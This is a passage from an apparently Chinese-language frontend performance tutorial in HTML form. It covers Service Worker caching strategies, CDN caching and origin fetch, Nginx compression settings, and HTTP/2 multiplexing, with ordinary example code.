  navigator<span class="token punctuation">.</span>serviceWorker<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token string">'/sw.js'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">scope</span><span class="token operator">:</span> <span class="token string">'/'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">reg</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'SW注册成功'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">err</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'SW注册失败'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>sw.js - 安装阶段：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token constant">CACHE_NAME</span> <span class="token operator">=</span> <span class="token string">'v1-static'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token constant">PRE_CACHE_URLS</span> <span class="token operator">=</span> <span class="token punctuation">[</span>  <span class="token comment">// 预缓存列表</span>
  <span class="token string">'/'</span><span class="token punctuation">,</span>
  <span class="token string">'/index.html'</span><span class="token punctuation">,</span>
  <span class="token string">'/styles.css'</span><span class="token punctuation">,</span>
  <span class="token string">'/app.js'</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>

self<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'install'</span><span class="token punctuation">,</span> <span class="token parameter">event</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  event<span class="token punctuation">.</span><span class="token function">waitUntil</span><span class="token punctuation">(</span>
    caches<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token constant">CACHE_NAME</span><span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">cache</span> <span class="token operator">=></span> cache<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span><span class="token constant">PRE_CACHE_URLS</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">// 预缓存核心资源</span>
      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> self<span class="token punctuation">.</span><span class="token function">skipWaiting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">// 强制激活新SW</span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>(2) 缓存策略实施 - 拦截请求并响应：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">self<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'fetch'</span><span class="token punctuation">,</span> <span class="token parameter">event</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  event<span class="token punctuation">.</span><span class="token function">respondWith</span><span class="token punctuation">(</span>
    <span class="token comment">// 策略1：缓存优先（离线优先）</span>
    caches<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>request<span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">cached</span> <span class="token operator">=></span> cached <span class="token operator">||</span> <span class="token function">fetchAndCache</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>request<span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token comment">// 策略2：网络优先（实时数据）</span>
    <span class="token comment">/*
    fetch(event.request)
      .catch(() => caches.match(event.request))
    */</span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 网络请求并缓存</span>
<span class="token keyword">function</span> <span class="token function">fetchAndCache</span><span class="token punctuation">(</span><span class="token parameter">request</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token function">fetch</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">networkRes</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 克隆响应（流只能读取一次）</span>
    <span class="token keyword">const</span> resClone <span class="token operator">=</span> networkRes<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    caches<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token constant">CACHE_NAME</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">cache</span> <span class="token operator">=></span> cache<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> resClone<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> networkRes<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>缓存更新机制</strong></p>
<p>(1) 版本化缓存命名</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 更新SW时修改版本号</span>
<span class="token keyword">const</span> <span class="token constant">CACHE_NAME</span> <span class="token operator">=</span> <span class="token string">'v2-static'</span><span class="token punctuation">;</span>  <span class="token comment">// 新版本</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>(2) 激活阶段清理旧缓存</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">self<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'activate'</span><span class="token punctuation">,</span> <span class="token parameter">event</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  event<span class="token punctuation">.</span><span class="token function">waitUntil</span><span class="token punctuation">(</span>
    caches<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">cacheNames</span> <span class="token operator">=></span> 
      Promise<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span>
        cacheNames<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">name</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>name <span class="token operator">!==</span> <span class="token constant">CACHE_NAME</span><span class="token punctuation">)</span> <span class="token keyword">return</span> caches<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 删除旧缓存</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
      <span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> self<span class="token punctuation">.</span>clients<span class="token punctuation">.</span><span class="token function">claim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">// 立即控制所有页面</span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>性能优化技巧</strong></p>
<p>(1) 缓存分段策略</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token constant">CORE_CACHE</span> <span class="token operator">=</span> <span class="token string">'core-v1'</span><span class="token punctuation">;</span>   <span class="token comment">// 核心页面</span>
<span class="token keyword">const</span> <span class="token constant">IMG_CACHE</span> <span class="token operator">=</span> <span class="token string">'images-v1'</span><span class="token punctuation">;</span>  <span class="token comment">// 图片资源</span>
<span class="token keyword">const</span> <span class="token constant">API_CACHE</span> <span class="token operator">=</span> <span class="token string">'api-v1'</span><span class="token punctuation">;</span>     <span class="token comment">// API数据</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>(2) 动态缓存限制</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 缓存最多50个API响应</span>
caches<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token constant">API_CACHE</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">cache</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  cache<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">keys</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>keys<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">50</span><span class="token punctuation">)</span> cache<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span>keys<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>(3) Stale-While-Revalidate</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">event<span class="token punctuation">.</span><span class="token function">respondWith</span><span class="token punctuation">(</span>
  caches<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">cached</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> fetchPromise <span class="token operator">=</span> <span class="token function">fetchAndCache</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> cached <span class="token operator">||</span> fetchPromise<span class="token punctuation">;</span>  <span class="token comment">// 优先返回缓存，后台更新</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>完整示例架构</strong></p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">/public
  ├── index.html
  ├── styles.css
  ├── app.js
  └── sw.js   # Service Worker主文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// sw.js</span>
<span class="token keyword">const</span> <span class="token constant">CORE_CACHE</span> <span class="token operator">=</span> <span class="token string">'core-v1'</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token constant">CORE_URLS</span> <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'/offline.html'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">// 安装阶段</span>
self<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'install'</span><span class="token punctuation">,</span> <span class="token parameter">event</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  event<span class="token punctuation">.</span><span class="token function">waitUntil</span><span class="token punctuation">(</span>
    caches<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token constant">CORE_CACHE</span><span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">cache</span> <span class="token operator">=></span> cache<span class="token punctuation">.</span><span class="token function">addAll</span><span class="token punctuation">(</span><span class="token constant">CORE_URLS</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> self<span class="token punctuation">.</span><span class="token function">skipWaiting</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 激活清理</span>
self<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'activate'</span><span class="token punctuation">,</span> <span class="token parameter">event</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  event<span class="token punctuation">.</span><span class="token function">waitUntil</span><span class="token punctuation">(</span>
    caches<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">keys</span> <span class="token operator">=></span> 
      Promise<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span>keys<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">key</span> <span class="token operator">=></span> 
        key <span class="token operator">!==</span> <span class="token constant">CORE_CACHE</span> <span class="token operator">?</span> caches<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">:</span> Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      <span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> self<span class="token punctuation">.</span>clients<span class="token punctuation">.</span><span class="token function">claim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 拦截请求</span>
self<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'fetch'</span><span class="token punctuation">,</span> <span class="token parameter">event</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> request <span class="token punctuation">&#125;</span> <span class="token operator">=</span> event<span class="token punctuation">;</span>
  
  <span class="token comment">// 导航请求回退到离线页面</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>mode <span class="token operator">===</span> <span class="token string">'navigate'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    event<span class="token punctuation">.</span><span class="token function">respondWith</span><span class="token punctuation">(</span>
      <span class="token function">fetch</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> caches<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token string">'/offline.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token comment">// 静态资源缓存优先</span>
  event<span class="token punctuation">.</span><span class="token function">respondWith</span><span class="token punctuation">(</span>
    caches<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">cached</span> <span class="token operator">=></span> 
      cached <span class="token operator">||</span> <span class="token function">fetch</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 仅缓存安全资源</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isCacheable</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> res<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
          <span class="token keyword">const</span> clone <span class="token operator">=</span> res<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          caches<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token function">dynamicCacheName</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">cache</span> <span class="token operator">=></span> 
            cache<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> clone<span class="token punctuation">)</span>
          <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
    <span class="token punctuation">)</span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">isCacheable</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> req<span class="token punctuation">.</span>method <span class="token operator">===</span> <span class="token string">'GET'</span> <span class="token operator">&amp;&amp;</span> 
         res<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token number">200</span> <span class="token operator">&amp;&amp;</span> 
         <span class="token operator">!</span>req<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'/api/private'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="4-2-资源加载优化"><a href="#4-2-资源加载优化" class="headerlink" title="4.2 资源加载优化"></a>4.2 资源加载优化</h2><h3 id="CDN原理与缓存配置（边缘节点-回源策略）"><a href="#CDN原理与缓存配置（边缘节点-回源策略）" class="headerlink" title="CDN原理与缓存配置（边缘节点&#x2F;回源策略）"></a>CDN原理与缓存配置（边缘节点&#x2F;回源策略）</h3><p><strong>CDN 核心原理</strong></p>
<p>定义：内容分发网络（Content Delivery Network），通过全球分布的边缘节点缓存静态资源，使用户就近访问，降低延迟与源站压力。</p>
<pre><code class="mermaid">graph LR
  A[用户] --&gt; B&#123;就近边缘节点&#125;
  B --&gt;|资源命中| C[快速返回缓存]
  B --&gt;|资源未命中| D[回源站拉取资源]
  D --&gt; E[缓存至边缘节点]
  E --&gt; A</code></pre>

<p>三大核心组件：</p>
<ul>
<li>边缘节点（Edge Node）</li>
<li>回源策略（Origin Fetch）</li>
<li>调度系统（DNS负载均衡）</li>
</ul>
<p><strong>边缘节点（Edge Node）</strong></p>
<ul>
<li>位置：全球数百个POP点（Point of Presence）</li>
<li>功能：<ul>
<li>直接响应终端用户请求</li>
<li>缓存静态资源（HTML&#x2F;CSS&#x2F;JS&#x2F;图片&#x2F;视频）</li>
<li>执行安全防护（DDoS缓解&#x2F;WAF）</li>
</ul>
</li>
</ul>
<p><strong>回源策略（Origin Fetch）</strong></p>
<ul>
<li>触发条件：边缘节点无缓存或缓存过期</li>
<li>回源流程：</li>
</ul>
<pre><code class="mermaid">sequenceDiagram
    participant User as 用户
    participant EdgeNode as CDN边缘节点
    participant Origin as 源站服务器

    User-&gt;&gt;EdgeNode: 1. 请求资源 &#x2F;image.jpg
    Note right of EdgeNode: 检查本地缓存
    alt 缓存命中且有效
        EdgeNode--&gt;&gt;User: 2. 直接返回缓存资源
    else 缓存未命中或过期
        EdgeNode-&gt;&gt;Origin: 3. 回源请求 (携带缓存验证头)
        Origin--&gt;&gt;EdgeNode: 4. 返回资源 + 缓存头
        EdgeNode-&gt;&gt;EdgeNode: 5. 缓存资源 (按策略)
        EdgeNode--&gt;&gt;User: 6. 返回资源
    end</code></pre>

<p><strong>调度系统（DNS负载均衡）</strong></p>
<ul>
<li>GSLB（全局负载均衡）：根据用户IP分配最近节点</li>
<li>调度算法：<ul>
<li>地理位置优先</li>
<li>节点健康检查</li>
<li>实时流量分析</li>
</ul>
</li>
</ul>
<p><strong>缓存配置策略</strong></p>
<p>(1) 规则设置</p>
<table>
<thead>
<tr>
<th align="left">配置方式</th>
<th align="left">指令示例</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">强制缓存</td>
<td align="left">Cache-Control: public, max-age&#x3D;86400</td>
<td align="left">资源在CDN缓存1天</td>
</tr>
<tr>
<td align="left">忽略缓存</td>
<td align="left">Cache-Control: no-store</td>
<td align="left">CDN不缓存（每次回源）</td>
</tr>
<tr>
<td align="left">条件缓存</td>
<td align="left">Cache-Control: no-cache</td>
<td align="left">CDN每次回源验证（类似协商缓存）</td>
</tr>
</tbody></table>
<p>(2) 典型资源配置</p>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token comment"># Nginx配置示例（源站）</span>
<span class="token directive"><span class="token keyword">location</span> ~* \.(js|css|png)$</span> <span class="token punctuation">&#123;</span>
  <span class="token directive"><span class="token keyword">add_header</span> Cache-Control <span class="token string">"public, max-age=31536000, immutable"</span></span><span class="token punctuation">;</span>  <span class="token comment"># 静态资源长缓存</span>
<span class="token punctuation">&#125;</span>

<span class="token directive"><span class="token keyword">location</span> /api/</span> <span class="token punctuation">&#123;</span>
  <span class="token directive"><span class="token keyword">add_header</span> Cache-Control <span class="token string">"no-cache"</span></span><span class="token punctuation">;</span>  <span class="token comment"># API不缓存</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>边缘节点缓存行为</strong></p>
<table>
<thead>
<tr>
<th align="left">请求状态</th>
<th align="left">处理方式</th>
<th align="left">响应时间对比源站</th>
</tr>
</thead>
<tbody><tr>
<td align="left">缓存命中</td>
<td align="left">直接返回资源</td>
<td align="left">快 5-10倍（&lt;50ms）</td>
</tr>
<tr>
<td align="left">缓存未命中</td>
<td align="left">回源拉取 → 缓存 → 返回</td>
<td align="left">与源站相同</td>
</tr>
<tr>
<td align="left">缓存过期</td>
<td align="left">回源验证（If-Modified-Since）</td>
<td align="left">节省带宽（304响应）</td>
</tr>
</tbody></table>
<h3 id="资源压缩（Gzip-Brotli）与HTTP-2多路复用"><a href="#资源压缩（Gzip-Brotli）与HTTP-2多路复用" class="headerlink" title="资源压缩（Gzip&#x2F;Brotli）与HTTP&#x2F;2多路复用"></a>资源压缩（Gzip&#x2F;Brotli）与HTTP&#x2F;2多路复用</h3><p><strong>资源压缩（Gzip vs Brotli）</strong></p>
<p>核心目标：减小资源体积 → 降低传输时间</p>
<table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">Gzip</th>
<th align="left">Brotli</th>
<th align="left">优势对比</th>
</tr>
</thead>
<tbody><tr>
<td align="left">压缩率</td>
<td align="left">减少70%大小</td>
<td align="left">减少85%大小</td>
<td align="left">Brotli高20%+</td>
</tr>
<tr>
<td align="left">算法原理</td>
<td align="left">DEFLATE算法（LZ77+哈夫曼）</td>
<td align="left">LZ77改进+上下文建模</td>
<td align="left">更高效字典压缩</td>
</tr>
<tr>
<td align="left">压缩速度</td>
<td align="left">快（低CPU消耗）</td>
<td align="left">慢（压缩时CPU高3倍）</td>
<td align="left">Gzip更适合动态压缩</td>
</tr>
<tr>
<td align="left">解压速度</td>
<td align="left">极快</td>
<td align="left">极快</td>
<td align="left">持平</td>
</tr>
<tr>
<td align="left">浏览器支持</td>
<td align="left">全平台（IE6+）</td>
<td align="left">Chrome&gt;50, Firefox&gt;44, Safari&gt;15</td>
<td align="left">Gzip兼容性更广</td>
</tr>
<tr>
<td align="left">最佳适用</td>
<td align="left">动态内容（API响应）</td>
<td align="left">静态资源（JS&#x2F;CSS&#x2F;字体）</td>
<td align="left"></td>
</tr>
</tbody></table>
<p>配置示例：</p>
<pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token comment"># 启用双压缩策略</span>
<span class="token directive"><span class="token keyword">gzip</span> <span class="token boolean">on</span></span><span class="token punctuation">;</span>
<span class="token directive"><span class="token keyword">gzip_types</span> text/plain text/css application/json application/javascript</span><span class="token punctuation">;</span>
<span class="token directive"><span class="token keyword">gzip_min_length</span> <span class="token number">1024</span></span><span class="token punctuation">;</span>  <span class="token comment"># 大于1KB才压缩</span>

<span class="token directive"><span class="token keyword">brotli</span> <span class="token boolean">on</span></span><span class="token punctuation">;</span>
<span class="token directive"><span class="token keyword">brotli_types</span> application/xml image/svg+xml</span><span class="token punctuation">;</span>
<span class="token directive"><span class="token keyword">brotli_static</span> <span class="token boolean">on</span></span><span class="token punctuation">;</span>      <span class="token comment"># 优先使用预压缩文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>前端收益：</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">原始文件： 200KB
Gzip后：  60KB（节省140KB）
Brotli后：30KB（节省170KB） → 3G网络下加载时间减少40%<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>HTTP&#x2F;2多路复用（Multiplexing）</strong></p>
<p>核心问题：HTTP&#x2F;1.1的队头阻塞（6个TCP连接限制）</p>
<pre><code class="mermaid">graph LR
  A[HTTP&#x2F;1.1] --&gt; B[请求1] --&gt; C[响应1] --&gt; D[请求2] --&gt; E[响应2]
  F[HTTP&#x2F;2] --&gt; G[请求1&#x2F;2&#x2F;3] --&gt; H[响应1&#x2F;2&#x2F;3 并行]</code></pre>

<p>实现原理：</p>
<ul>
<li>二进制分帧层：<ul>
<li>将请求&#x2F;响应分解为二进制帧（HEADERS&#x2F;DATA）</li>
<li>每个帧携带流ID（Stream Identifier）</li>
</ul>
</li>
<li>流优先级：</li>
</ul>
<pre><code class="mermaid">graph TB
  S1[流ID11 CSS] --&gt;|优先级高| 浏览器
  S2[流ID13 JS] --&gt;|优先级中| 浏览器
  S3[流ID15 图片] --&gt;|优先级低| 浏览器</code></pre>

<p>性能对比：</p>
<table>
<thead>
<tr>
<th align="left">场景</th>
<th align="left">HTTP&#x2F;1.1</th>
<th align="left">HTTP&#x2F;2</th>
<th align="left">提升</th>
</tr>
</thead>
<tbody><tr>
<td align="left">100个小文件（1KB）</td>
<td align="left">1.5s（6连接排队）</td>
<td align="left">0.3s（单连接并行）</td>
<td align="left">80%</td>
</tr>
<tr>
<td align="left">首屏渲染时间</td>
<td align="left">2.8s</td>
<td align="left">1.5s</td>
<td align="left">46%</td>
</tr>
<tr>
<td align="left">TCP连接数</td>
<td align="left">6-8个</td>
<td align="left">1个</td>
<td align="left">资源节省</td>
</tr>
</tbody></table>
<p><strong>HTTP&#x2F;2核心特性协同优化</strong></p>
<table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left">配合压缩与多路复用的作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">头部压缩（HPACK）</td>
<td align="left">减少请求头体积（Cookie&#x2F;User-Agent等）</td>
</tr>
<tr>
<td align="left">服务器推送</td>
<td align="left">主动推送关键资源（无需等待HTML解析）</td>
</tr>
<tr>
<td align="left">流优先级</td>
<td align="left">优先传输CSS&#x2F;JS（保障渲染速度）</td>
</tr>
</tbody></table>
<p>完整工作流：</p>
<pre><code class="mermaid">sequenceDiagram
    participant Client
    participant Server

    Client-&gt;&gt;Server: 发起HTTPS连接（TLS握手）
    Server-&gt;&gt;Client: 返回HTTP&#x2F;2协议支持
    Client-&gt;&gt;Server: 发送HEADERS帧（含HPACK压缩头）
